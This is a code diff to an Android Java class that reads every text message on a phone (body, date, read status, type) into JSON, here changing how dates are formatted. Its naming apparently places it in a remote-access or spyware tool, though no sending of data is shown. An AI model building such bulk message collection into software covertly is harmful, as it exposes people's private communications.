@@ -11,6 +11,10 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+
 public class SMSManager {
 
     public static JSONObject getsms()  {
@@ -23,16 +27,18 @@ public class SMSManager {
             Uri uri = Uri.parse("content://sms/");
             Context act = MainService.getContextOfApplication();
 
-            Cursor c= act.getContentResolver().query(uri, null, null ,null,"date DESC");
+            Cursor c= act.getContentResolver().query(uri, null, null ,null,null);
 
             // Read the sms data and store it in the list
             if(c.moveToFirst()) {
 
                 for(int i=0; i < c.getCount(); i++) {
 
-                    result.put("body",c.getString(c.getColumnIndexOrThrow("body")).toString());
 
-                    result.put("date",c.getString(c.getColumnIndexOrThrow("date")).toString());
+                    result.put("body",c.getString(c.getColumnIndexOrThrow("body")).toString());
+                    long date = Long.parseLong(c.getString(c.getColumnIndexOrThrow("date")).toString());
+                    String dateTime = new SimpleDateFormat("dd MMM yyyy hh:mm a", Locale.ENGLISH).format(new Date(date));
+                    result.put("date",dateTime);
                     result.put("read",c.getString(c.getColumnIndexOrThrow("read")).toString());
                     result.put("type",c.getString(c.getColumnIndexOrThrow("type")).toString());
                     if((c.getString(c.getColumnIndexOrThrow("type")).toString()).equals("3")) {
